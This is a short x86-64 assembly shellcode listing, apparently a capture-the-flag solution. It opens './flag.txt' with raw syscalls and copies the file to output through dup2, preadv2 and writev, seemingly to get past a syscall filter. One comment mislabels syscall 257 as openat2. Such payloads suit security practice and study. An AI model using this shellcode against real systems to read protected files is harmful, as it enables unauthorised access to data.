    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    ; openat2
    mov rdi, -100
    lea rsi, flagpath
    mov rdx, 0x0
    mov r10, 0x0
    mov rax, 257
    syscall

    ; dup2
    mov rdi, 0x1
    mov rsi, 0x100000000
    mov rax, 33
    syscall

    ; iovec
    mov r12, rsp
    sub r12, 0x200
    
    push 0x100
    push r12

    ; preadv2
    mov rdi, 0x3
    mov rsi, rsp
    mov rdx, 0x1
    mov r10, 0x0
    mov r8, 0x0
    mov r9, 0x0
    mov rax, 327
    syscall

    ; writev
    mov rdi, 0x100000000
    mov rax, 20
    syscall

    nop
    nop

flagpath: db "./flag.txt", 0